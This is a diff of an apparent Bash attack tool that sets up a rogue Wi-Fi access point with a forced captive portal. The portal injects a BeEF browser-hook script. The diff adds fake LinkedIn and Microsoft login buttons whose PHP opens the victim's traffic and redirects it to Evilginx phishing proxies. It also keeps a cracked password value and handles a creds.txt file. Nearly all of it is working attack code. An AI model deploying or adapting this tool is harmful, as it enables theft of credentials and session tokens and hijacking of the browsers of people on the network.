@@ -1,14 +1,7 @@
 #!/bin/bash
-RED='\033[0;31m'
-BRED='\033[1;31m'
-GREEN='\033[1;32m'
-YELLOW='\033[0;33m'
-BLUE='\033[1;34m'
-PURPLE='\033[0;35m'
-CYAN='\033[1;36m'
-NC='\033[0m'
 
-#sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant && sudo airmon-ng check ki
+
+#sudo systemctl stop NetworkManager && sudo systemctl stop wpa_supplicant && sudo airmon-ng check kill
 
 MON_INTERFACE=""
 SELECTED_INTERFACE="wlan0"
@@ -23,16 +16,29 @@ BEACONS_VAR=""
 ESSID_VAR="PI_WIFI_TEST"
 PASSWORD_CRACKED="A123456789a!"
 
-
+#Variables Hostapd
 IP_PORTAL=192.168.1.1
 HTTP=80
 HTTPS=443
 DNS=53
 
+#Variables Evilginx
+EVILGINX_LINK1=""
+EVILGINX_LINK2=""
+EVILGINX_HTML_LINKEDIN=""
+EVILGINX_HTML_MICROSOFT=""
+EVILGINX_CSS=""
+DIRECTORY_EVIL="./templates/evilginx/"
+FILE_LINKEDIN="linkedin_login.php"
+FILE_MICROSOFT="microsoft_login.php"
+LOGO_LINKEDIN="logo_linkedin.svg"
+LOGO_MICROSOFT="logo_microsoft.svg"
+CHOICE_EVIL=""
+
 #Variables BEEF
-WANTS_BEEF="$1"
+VARIATION="$1" #Sacar el $1 al pasar al interceptor.sh
 BEEF_HTML=""
-IP_HOOK="192.168.1.1"
+IP_HOOK=""
 
 #Variable archivos
 DIRECTORY="./templates/"
@@ -52,7 +58,7 @@ DIR_WEB=/var/www/html/
 FILE_hostapd="hostapd.conf"
 
 DIR_APACHE_SITE="/etc/apache2/sites-available"
-FILE_Apache="000-default.conf"
+FILE_default="000-default.conf"
 FILE_ssl="default-ssl.conf"
 FILE_htaccess="htaccess"
 
@@ -114,11 +120,11 @@ rules_iptables_ipforward(){
     sudo iptables -A FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT
 
     #Peticiones HTTP/S van al portal de apache2
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination $IP_PORTAL:$HTTP
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination $IP_PORTAL:$HTTPS
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"
     #Todas las peticiones se van al dns local
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination $IP_PORTAL:$DNS
-    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination $IP_PORTAL:$DNS
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
+    iptables -t nat -A PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
 
 }
 
@@ -202,6 +208,8 @@ foreach (\$captive_checks as \$check) {
             <input type="email" name="email" placeholder="Email" required>
             <button type="submit">Connect</button>
         </form>
+        $EVILGINX_HTML_LINKEDIN
+        $EVILGINX_HTML_MICROSOFT
     </div>
 </body>
 </html>
@@ -285,6 +293,7 @@ button {
 button:hover {
     background: #0056b3;
 }
+$EVILGINX_CSS
 EOF
 
     echo "INTERFACESv4=\"${SELECTED_INTERFACE}\"" > "${DIRECTORY}${FILE_isc}"
@@ -308,10 +317,13 @@ bind-interfaces
 log-queries
 log-facility=/var/log/dnsmasq.log
 
-address=/connectivitycheck.gstatic.com/$IP_PORTAL
+address=/connectivitycheck.android.com/$IP_PORTAL
 address=/clients3.google.com/$IP_PORTAL
-address=/capcha.apple.com/$IP_PORTAL
+address=/apple.com/$IP_PORTAL
 address=/msftconnecttest.com/$IP_PORTAL
+address=/nmcheck.gnome.org/$IP_PORTAL
+address=/network-test.debian.org/$IP_PORTAL
+
 server=8.8.8.8
 EOF
 
@@ -369,7 +381,6 @@ wpa=0
 ignore_broadcast_ssid=0
 EOF
     fi
-    echo "Done hostapd.conf Correctly."
 }
 
 configure_apache2(){
@@ -378,15 +389,36 @@ configure_apache2(){
     -keyout /etc/ssl/private/captive-portal.key \
     -out /etc/ssl/certs/captive-portal.crt \
     -days 365 -nodes \
-    -subj "/C=ES/ST=Catalunya/L=Barcelona/O=CaptivePortal/OU=IT/CN=captive.portal"
+    -subj "/C=ES/ST=Catalunya/L=Barcelona/O=CaptivePortal/OU=IT/CN=captive.portal" > /dev/null
+
 
     #Desactivamos las paginas webs para cambiar la configuración
-    sudo a2dissite 000-default.conf
-    sudo a2dissite default-ssl.conf
+    sudo a2dissite 000-default.conf > /dev/null
+    sudo a2dissite default-ssl.conf > /dev/null
 
     # Por si acaso activamos los modulos de rewrite y ssl de apache (Normalmente viene activo)
-    sudo a2enmod rewrite
-    sudo a2enmod ssl
+    sudo a2enmod rewrite > /dev/null
+    sudo a2enmod ssl > /dev/null
+}
+configure_beef_local(){
+    
+    if [ -d /etc/beef-xss ]; then
+        sudo cp ./templates/beef/config.yaml /etc/beef-xss/config.yaml
+        sudo chown beef-xss:beef-xss /etc/beef-xss/config.yaml
+
+    else
+        echo "The directory /etc/beef-xss does not exist"
+        return 1
+    fi
+
+    sudo cp /etc/ssl/private/captive-portal.key /etc/beef-xss/
+    sudo cp /etc/ssl/certs/captive-portal.crt /etc/beef-xss/
+    sudo chmod 644 /etc/beef-xss/captive-portal.key
+    sudo chmod 644 /etc/beef-xss/captive-portal.crt
+    sudo chmod o+x /etc/beef-xss
+
+    return 0
+
 }
 
 move_files_created(){
@@ -408,6 +440,51 @@ move_files_created(){
     sudo cp "${DIRECTORY}${FILE_CSS}" "${DIR_WEB}${FILE_CSS}"
     check_success "cp "${DIRECTORY}${FILE_CSS}" "${DIR_WEB}${FILE_CSS}""
 
+    #Archivos dns server
+    sudo cp "${DIRECTORY}${FILE_dns}" "${DIR_ETC}${FILE_dns}"
+    check_success "cp "${DIRECTORY}${FILE_dns}" "${DIR_ETC}${FILE_dns}""
+
+    #Apache Config
+    sudo cp "${DIRECTORY_APACHE}${FILE_default}" "${DIR_APACHE_SITE}${FILE_default}"
+    check_success "cp "${DIRECTORY_APACHE}${FILE_default}" "${DIR_APACHE_SITE}${FILE_default}""
+
+    sudo cp "${DIRECTORY_APACHE}${FILE_ssl}" "${DIR_APACHE_SITE}${FILE_ssl}"
+    check_success "cp "${DIRECTORY_APACHE}${FILE_ssl}" "${DIR_APACHE_SITE}${FILE_ssl}""
+
+    #Archivo .htaccess de la plantilla para el captive portal.
+    sudo cp "${DIRECTORY_APACHE}${FILE_htaccess}" "${DIR_WEB}.${FILE_htaccess}"
+    check_success "cp "${DIRECTORY_APACHE}${FILE_htaccess}" "${DIR_WEB}.${FILE_htaccess}""
+
+    if [ "$VARIATION" -eq "2" ]; then
+        #Linkedin Only
+        if [ "$CHOICE_EVIL" -eq "1" ];then
+            #Archivos Linkedin hacia /etc/www/html
+            sudo cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}"
+            check_success "cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}""
+            sudo cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}"
+            check_success "cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}""
+        #Microsoft Only
+        elif [ "$CHOICE_EVIL" -eq "2" ];then
+            #Archivos Microsoft hacia /etc/www/html
+            sudo cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}"
+            check_success "cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}""
+            sudo cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}"
+            check_success "cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}""
+        else
+            #Archivos Linkedin hacia /etc/www/html
+            sudo cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}"
+            check_success "cp "${DIRECTORY_EVIL}${LOGO_LINKEDIN}" "${DIR_WEB}${LOGO_LINKEDIN}""
+            sudo cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}"
+            check_success "cp "${DIRECTORY}${FILE_LINKEDIN}" "${DIR_WEB}${FILE_LINKEDIN}""
+
+            #Archivos Microsoft hacia /etc/www/html
+            sudo cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}"
+            check_success "cp "${DIRECTORY_EVIL}${LOGO_MICROSOFT}" "${DIR_WEB}${LOGO_MICROSOFT}""
+            sudo cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}"
+            check_success "cp "${DIRECTORY}${FILE_MICROSOFT}" "${DIR_WEB}${FILE_MICROSOFT}""
+        fi
+
+    fi
     #Permisos pagina web
     sleep 1
 
@@ -417,24 +494,9 @@ move_files_created(){
     sudo chmod -R 777 /var/www/html
     check_success "chmod 664 /var/www/html/*"
 
-    sudo chown www-data:www-data /var/www/html/creds.txt
-    check_success "chown www-data:www-data /var/www/html/creds.txt"
+    sudo chown www-data:www-data /var/www/html/*
+    check_success "chown www-data:www-data /var/www/html/*"
 
-    #Archivos dns server
-    sudo cp "${DIRECTORY}${FILE_dns}" "${DIR_ETC}${FILE_dns}"
-    check_success "cp "${DIRECTORY}${FILE_dns}" "${DIR_ETC}${FILE_dns}""
-
-
-    #Apache Config
-    sudo cp "${DIRECTORY_APACHE}${FILE_Apache}" "${DIR_APACHE_SITE}${FILE_Apache}"
-    check_success "cp "${DIRECTORY_APACHE}${FILE_Apache}" "${DIR_APACHE_SITE}${FILE_Apache}""
-
-    sudo cp "${DIRECTORY_APACHE}${FILE_ssl}" "${DIR_APACHE_SITE}${FILE_ssl}"
-    check_success "cp "${DIRECTORY_APACHE}${FILE_ssl}" "${DIR_APACHE_SITE}${FILE_ssl}""
-
-    #Archivo .htaccess de la plantilla para el captive portal.
-    sudo cp "${DIRECTORY_APACHE}${FILE_htaccess}" "${DIR_WEB}.${FILE_Apache}"
-    check_success "cp "${DIRECTORY_APACHE}${FILE_htaccess}" "${DIR_WEB}.${FILE_Apache}""
 }
 
 activate_dhcp(){
@@ -460,19 +522,20 @@ activate_dns(){
     fi
 
 }
+
 activate_apache2(){
 
-    if ! sudo a2ensite 000-default.conf ;then
+    if ! sudo a2ensite 000-default.conf > /dev/null ;then
         echo "Can't enable site 000-default"
         return 1
     fi
     
-    if ! sudo a2ensite default-ssl.conf ;then
+    if ! sudo a2ensite default-ssl.conf > /dev/null;then
         echo "Can't enable site default-ssl"
         return 1
     fi 
     
-    if ! sudo systemctl restart apache2 ; then 
+    if ! sudo systemctl restart apache2 > /dev/null; then 
         echo "Can't Start Apache Service"
         return 1
     fi
@@ -482,18 +545,17 @@ activate_apache2(){
 }
 
 beef_hosted() {
-    read -p "Enter the public address of the Beef server: " IP_HOOK
-    if wget $IP_HOOK:3000/hook.js ; then
-        echo "Found hook on $IP_HOOK" 
+    read -p "Enter the public address ( Or Domain) of the Beef server: (MUST BE HTTPS) " IP_HOOK
+    if wget --spider --no-check-certificate https://$IP_HOOK:3000/hook.js > /dev/null ; then
+        echo "Found hook on https://$IP_HOOK:3000/hook.js"
     else
-        echo "Hook not found at $IP_HOOK:3000/hook.js"
+        echo "Hook not found at https://$IP_HOOK:3000/hook.js"
         return 1
     fi
 
-    rm hook.js
 
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        firefox --browser   --new-window $IP_HOOK:3000/ui/panel
+        firefox --browser   --new-window https://$IP_HOOK:3000/ui/panel
     else
         echo "You are not on graphic terminal we can't open beef panel"
     fi
@@ -501,25 +563,30 @@ beef_hosted() {
 }
 
 beef_local() {
-    IP_HOOK_Local="127.0.0.1"
-    
-    if ! sudo beef-xss; then 
-        echo "Error init beef"
+    IP_HOOK="192.168.1.1"
+
+    if ! configure_beef_local; then
+        echo "Error configuring beef"
         return 1
     fi
 
-    sleep 2
-    if wget $IP_HOOK_Local:3000/hook.js ; then  
-        echo "Found hook on $IP_HOOK_Local" 
-    else
-        echo "Hook not found at $IP_HOOK_Local:3000/hook.js"
+    if ! sudo systemctl restart beef-xss; then 
+        echo "Error initiate beef"
         return 1
     fi
-    rm hook.js
+
+    sleep 3
+    if wget --spider --no-check-certificate https://$IP_HOOK:3000/hook.js ; then  
+        echo "Found hook on $IP_HOOK" 
+    else
+        echo "Hook not found at https://$IP_HOOK:3000/hook.js"
+        return 1
+    fi
+
     
 
     if [[ -n "$DISPLAY" || -n "$WAYLAND_DISPLAY" ]]; then
-        firefox --browser --new-window $IP_HOOK_Local:3000/ui/panel
+        firefox --browser --new-window https://$IP_HOOK_Local:3000/ui/panel
     else
         echo "You are not on graphic terminal we can't open beef panel"
     fi
@@ -557,9 +624,182 @@ beef_menu() {
     return 0
 }
 
+make_linkedin(){
+
+    read -p "Enter the full URL of the PHISHLET of linkedin: " URL_PHISHLET_LINKEDIN
+
+    #HTML Botón Linkedin con referencia al php
+    EVILGINX_HTML_LINKEDIN=$(cat <<EOF
+<a class="linkedin-btn" href="/$FILE_LINKEDIN">
+    <img class="linkedin-icon" src="/$LOGO_LINKEDIN" alt="Google logo">
+    Iniciar sesión con Linkedin
+</a>
+EOF
+)
+    #PHP que en principio si le dan al botton le dejaria tener internet para conectarse al phishlet
+    cat <<EOF > "${DIRECTORY}${FILE_LINKEDIN}"
+<?php
+\$ip = \$_SERVER['REMOTE_ADDR'];
+
+// Allow internet traffic
+shell_exec("sudo iptables -D FORWARD -s \$ip -j ACCEPT 2>/dev/null");
+shell_exec("sudo iptables -I FORWARD -s \$ip -j ACCEPT");
+
+
+// Make sure it have dns
+shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -j RETURN");
+shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -j RETURN");
+
+// Redirect to phishlet
+header("Location: $URL_PHISHLET_LINKEDIN");
+exit();
+?>
+EOF
+
+
+
+    EVILGINX_CSS=$(cat <<EOF
+.linkedin-btn {
+    display: flex;
+    align-items: center;
+    background-color: #0077b5;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    padding: 10px 16px;
+    font-size: 14px;
+    font-weight: 500;
+    font-family: 'Segoe UI', sans-serif;
+    text-decoration: none;
+    width: fit-content;
+    transition: background-color 0.2s ease;
+}
+
+.linkedin-btn:hover {
+    background-color: #005f91;
+}
+
+.linkedin-icon {
+    height: 20px;
+    margin-right: 10px;
+}
+EOF
+)
+    return 0
+}
+
+make_microsoft(){
+
+    read -p "Enter the full URL of the PHISHLET Microsoft: " URL_PHISHLET_MICROSOFT
+
+    EVILGINX_HTML_MICROSOFT=$(cat <<EOF
+<a class="microsoft-btn" href="$FILE_MICROSOFT">
+    <img class="microsoft-icon" src="$LOGO_MICROSOFT" alt="Microsoft logo">
+    Iniciar sesión con Microsoft
+</a>
+EOF
+)
+
+
+    cat <<EOF > "${DIRECTORY}${FILE_MICROSOFT}"
+<?php
+\$ip = \$_SERVER['REMOTE_ADDR'];
+
+// Allow internet traffic
+shell_exec("sudo iptables -D FORWARD -s \$ip -j ACCEPT 2>/dev/null");
+shell_exec("sudo iptables -I FORWARD -s \$ip -j ACCEPT");
+
+// Make sure it have dns
+shell_exec("sudo iptables -t nat -I PREROUTING -p udp --dport 53 -s \$ip -j RETURN");
+shell_exec("sudo iptables -t nat -I PREROUTING -p tcp --dport 53 -s \$ip -j RETURN");
+
+// Redirect to phishlet
+header("Location: $URL_PHISHLET_MICROSOFT");
+exit();
+?>
+EOF
+
+
+EVILGINX_CSS+=$(cat <<EOF
+.microsoft-btn {
+    display: flex;
+    align-items: center;
+    background-color: #f3f3f3;
+    color: #000;
+    border: 1px solid #d6d6d6;
+    border-radius: 4px;
+    padding: 10px 16px;
+    font-size: 14px;
+    font-weight: 500;
+    font-family: 'Segoe UI', sans-serif;
+    text-decoration: none;
+    width: fit-content;
+    transition: background-color 0.2s ease;
+}
+
+.microsoft-btn:hover {
+    background-color: #e6e6e6;
+}
+
+.microsoft-icon {
+    height: 20px;
+    margin-right: 10px;
+}
+EOF
+)
+    return 0
+}
+
+evilginx_menu(){
+
+    MENU_DONE=false
+    while [ "$MENU_DONE" != true ]; do
+        echo "Select what phishlets you want to insert (Linkedin / Microsoft):"
+        echo "1. Linkedin"
+        echo "2. Microsoft"
+        echo "3. Linkedin + Microsoft"
+        read -p "Choose an option: " CHOICE_EVIL
+
+        case "$CHOICE_EVIL" in
+            1)
+                MENU_DONE=true
+                if ! make_linkedin; then 
+                    return 1
+                fi
+                ;;
+            2)
+                MENU_DONE=true
+                if ! make_microsoft; then 
+                    return 1
+                fi
+                ;;
+            3)
+                MENU_DONE=true
+                if ! make_linkedin; then 
+                    return 1
+                fi
+                if ! make_microsoft; then 
+                    return 1
+                fi
+                ;;
+            *)
+                echo "Wrong number. Please choose 1, 2 or 3."
+                ;;
+        esac
+    done
+    return 0
+
+}
+
+turn_off_services(){
+    sudo systemctl stop isc-dhcp-server
+    sudo systemctl stop dnsmasq
+    sudo systemctl stop beef-xss
+    sudo systemctl stop apache2    
+}
+
 cleanup() {
     echo "[+] Restaurando configuración de red..."
-
 
     # Eliminar la regla NAT de POSTROUTING
     sudo iptables -t nat -D POSTROUTING -o $INTERFACE_OUTPUT -j MASQUERADE
@@ -571,12 +811,12 @@ cleanup() {
     sudo iptables -D FORWARD -i $SELECTED_INTERFACE -o $INTERFACE_OUTPUT -j REJECT
 
     # Eliminar la regla de redirección del tráfico HTTP al portal cautivo
-    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL":"$HTTP"
-    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL":"$HTTPS"
+    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTP -j DNAT --to-destination "$IP_PORTAL:$HTTP"
+    sudo iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $HTTPS -j DNAT --to-destination "$IP_PORTAL:$HTTPS"
 
     # Eliminar la regla de redirección DNS UDP (puerto 53) a 192.168.1.1
-    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL":"$DNS"
-    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL":"$DNS"
+    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p udp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
+    iptables -t nat -D PREROUTING -i $SELECTED_INTERFACE -p tcp --dport $DNS -j DNAT --to-destination "$IP_PORTAL:$DNS"
 
     sudo sysctl -w net.ipv4.ip_forward=0
     echo "[+] Reglas de iptables eliminadas. Saliendo..."
@@ -589,21 +829,56 @@ cleanup() {
     sudo ip addr flush dev $SELECTED_INTERFACE
     sudo ip link set $SELECTED_INTERFACE down
 
-    sudo systemctl stop isc-dhcp-server
-    sudo systemctl stop dnsmasq
-    sudo systemctl stop beef-xss
-    sudo systemctl stop apache2    
+    turn_off_services
 
-    sudo iptables -F FORWARD
+    sudo iptables -F -t nat
 
-    sudo rm "${DIRECTORY}*"
+    sudo rm "${DIRECTORY}"*
     
 }
 
+set_interface_AP_MODE(){
+    
+    #Verificar si funciona y que si entramos con monitor lo pone en manager
+    if [[ ! -z "$MON_INTERFACE" ]];then
+        manager_mode
+    fi
+   
+    #Posem la interficie wireless en mode 
+    sudo ip link set $SELECTED_INTERFACE down
+    sudo iw dev $SELECTED_INTERFACE set type ap
+    sudo ip link set $SELECTED_INTERFACE up
+
+    #En caso que el usuario tenga ya una ip en la interfaz wifi
+    sudo ip addr flush dev $SELECTED_INTERFACE
+
+    #Insertamos una ip a la interficie
+    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE
+    check_success "ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE"
+
+}
 false_ap(){
 
-    if [ "$WANTS_BEEF" -eq "1" ]; then
-        echo "Mode beef"
+    #VARIATION="$1"
+
+    # while DOING = true ;do Deauther 0 ;done # Buscar una manera para poder crear hacer el deauther hasta que quiera que pare.
+    turn_off_services
+    configure_apache2
+    
+    if [[ "$VARIATION" -eq "2" ]]; then
+        echo "Evilginx Mode"
+
+        if ! evilginx_menu; then 
+            echo "Error"
+            exit 1
+        fi
+
+    fi
+
+    set_interface_AP_MODE
+
+    if [[ "$VARIATION" -eq "1" ]]; then
+        echo "Beef Mode"
         if ! beef_menu; then 
             echo "No se puede ejecutar el beef"
             exit 1
@@ -611,25 +886,14 @@ false_ap(){
             BEEF_HTML="<script src="https://$IP_HOOK:3000/hook.js"></script>"
         fi
     fi
-    #Verificar si funciona y que si entramos con monitor lo pone en manager
-    if [[ ! -z "$MON_INTERFACE" ]];then
-        manager_mode
-    fi
-
-    #Deauther 15 &
+    echo "Normal mode"
+    VARIATION="0"
+    
+    
 
     create_all_files_portal
     move_files_created
-    configure_apache2
-   
-    #Posem la interficie wireless en mode 
-    sudo ip link set $SELECTED_INTERFACE down
-    sudo iw dev $SELECTED_INTERFACE set type ap
-    sudo ip link set $SELECTED_INTERFACE up
-    #En caso que el usuario tenga ya una ip en la interfaz wifi
-    sudo ip addr flush dev $SELECTED_INTERFACE
-    #Insertamos una ip a la interficie
-    sudo ip addr add 192.168.1.1/24 dev $SELECTED_INTERFACE
+    
 
     if ! activate_dhcp; then 
         exit 1
@@ -646,7 +910,9 @@ false_ap(){
     fi
 
     rules_iptables_ipforward
-    sudo hostapd "${DIRECTORY}${FILE_hostapd}" # -Bfor broadcast
+    sudo hostapd "${DIRECTORY}${FILE_hostapd}" # -B for broadcast
+
+    # trap cleanup EXIT #Poner
 }
 
 
